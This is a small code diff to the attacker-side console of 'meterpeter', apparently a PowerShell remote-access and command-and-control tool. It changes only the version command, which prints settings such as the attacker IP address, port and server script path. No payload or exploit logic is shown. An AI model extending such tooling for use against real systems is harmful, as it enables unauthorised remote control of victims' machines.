@@ -389,14 +389,15 @@ While($Client.Connected)
     ## venom v1.0.16 function
     If($Command -eq "-v" -or $Command -eq "--version" -or $Command -eq "version")
     {
+      $Parse = "$IPATH"+"meterpeter.ps1"
       write-host "`n`n Current Settings" -ForegroundColor green;
       write-host " ----------------";
       write-host " meterpeter version   : 2.10.1";
       write-host " Attacker Arch        : $env:PROCESSOR_ARCHITECTURE";
-      write-host " Attacker IP addr     : $Local_Host";
+      write-host " Attacker IP addr     : $localIpAddress:$Local_Port";
       write-host " meterpeter flavor    : $Flavor Distro";
       write-host " meterpeter WebServer : $APACHE";
-      write-host " meterpeter Server    : $IPATH";
+      write-host " meterpeter Server    : $Parse";
     }
 
     ## venom v1.0.16 function
